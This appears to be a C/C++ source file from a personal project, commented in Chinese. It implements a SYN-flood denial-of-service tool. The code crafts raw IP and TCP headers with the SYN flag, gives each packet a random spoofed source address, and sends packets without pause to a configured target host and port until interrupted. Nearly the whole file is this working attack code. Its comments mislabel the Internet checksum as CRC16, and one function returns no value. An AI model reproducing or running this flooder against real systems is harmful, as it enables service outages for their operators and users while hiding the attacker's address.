//
// Created by 姚文锋 on 2018/9/20.
//
#include "define.h"

/* CRC16循环冗余校验函数 */
//unsigned short DoS_cksum (unsigned short *address, int len) {
//    unsigned long sum = 0;
//    unsigned short res = 0;
//    /* 计算偶数字节 */
//    while (len > 1) {
//        sum += *address++;
//        len -= 2;
//    }
//    /* 如果为奇数,将最后一个字节单独计算
//    *	剩余的一个字节为高字节构建一个short类型变量值
//    */
//    if (len == 1) {
//        *((unsigned char *) (&res)) = *((unsigned char *)
//                address);
//        sum += res;
//    }
//    /* 折叠 */
//    sum = (sum >> 16) + (sum & 0xffff);
//    sum += (sum >> 16);
//    /* 取反 */
//    res = (unsigned short )(~sum);
//    return res;
//}

/* CRC16校验 */
unsigned short inline checksum (unsigned short *buffer, unsigned short size) {
    unsigned long cksum = 0;
    while(size>1){
        cksum += *buffer++;
        size  -= sizeof(unsigned short);
    }
    if(size){
        cksum += *(unsigned char *)buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return((unsigned short )(~cksum));
}

/* 首部初始化函数
 * 填写IP头部，TCP头部
 * TCP伪头部仅用于校验和的计算
 */
void init_header(struct ip *ip, struct tcp *tcp, struct pseudo *pseudo_header) {
    int len = sizeof(struct ip) + sizeof(struct tcp);
    // IP头部数据初始化
    ip->hl = (4<<4 | sizeof(struct ip)/sizeof(unsigned int));
    ip->tos = 0;
    ip->total_len = htons(len);
    ip->id = 1;
    ip->frag_and_flags = 0x40; //不分片标志
    ip->ttl = 255;
    ip->proto = IPPROTO_TCP;
    ip->checksum = 0;
    ip->sourceIP = 0;
    ip->destIP = inet_addr(TARGET_HOST);

    // TCP头部数据初始化
    tcp->sport = htons( random()%16383 + 49152 );
    tcp->dport = htons(TARGET_PORT);
    tcp->seq = htonl( random()%90000000 + 2345 );
    tcp->ack = 0;
    tcp->lenres = (sizeof(struct tcp)/4<<4|0);
    tcp->flag = 0x02; //SYN标志
    tcp->win = htons (2048);
    tcp->sum = 0;
    tcp->urp = 0;

    //TCP伪头部
    pseudo_header->zero = 0;
    pseudo_header->protocol = IPPROTO_TCP;
    pseudo_header->length = htons(sizeof(struct tcp));
    pseudo_header->daddr = inet_addr(TARGET_HOST);
    srand((unsigned) time(NULL));
}

/* 发送SYN包函数
 * 填写IP头部，TCP头部
 * TCP伪头部仅用于校验和的计算
 */
void send_synflood(struct newSocketFd *address) {
    char buf[100], send_buf[100];
    size_t len;
    struct ip ip;			        //IP头部
    struct tcp tcp;		        //TCP头部
    struct pseudo pseudo_header;	//TCP伪头部
    struct sockaddr_in *new_address = &address->addr;

    len = sizeof(struct ip) + sizeof(struct tcp);

    /* 初始化头部信息 */
    init_header(&ip, &tcp, &pseudo_header);

    /* 处于活动状态时持续发送SYN包 */
    while(alive)
    {
        ip.sourceIP = (unsigned int)random();

        //计算IP校验和
        bzero(buf, sizeof(buf));
        memcpy(buf , &ip, sizeof(struct ip));
        ip.checksum = checksum((u_short *) buf, sizeof(struct ip));

        pseudo_header.saddr = ip.sourceIP;

        //计算TCP校验和
        bzero(buf, sizeof(buf));
        memcpy(buf , &pseudo_header, sizeof(pseudo_header));
        memcpy(buf+sizeof(pseudo_header), &tcp, sizeof(struct tcp));
        tcp.sum = checksum((u_short *) buf, sizeof(pseudo_header)+sizeof(struct tcp));

        bzero(send_buf, sizeof(send_buf));
        memcpy(send_buf, &ip, sizeof(struct ip));
        memcpy(send_buf+sizeof(struct ip), &tcp, sizeof(struct tcp));
        printf(".");
        if (sendto(address->sock_fd, send_buf, len, 0, (struct sockaddr *) new_address, sizeof(struct sockaddr))< 0)
        {
            perror("sendto()");
//            pthread_exit("fail");
        }
//        sleep(1);
    }
}

void sig_int(int signo) {
    alive = 0;
}

int syn() {
    int ipLen = sizeof(struct ip);
    int tcpLen = sizeof(struct tcp);
    int pseudoLen = sizeof(struct pseudo);
    cout << ipLen << endl;
    cout << tcpLen << endl;
    cout << pseudoLen << endl;
}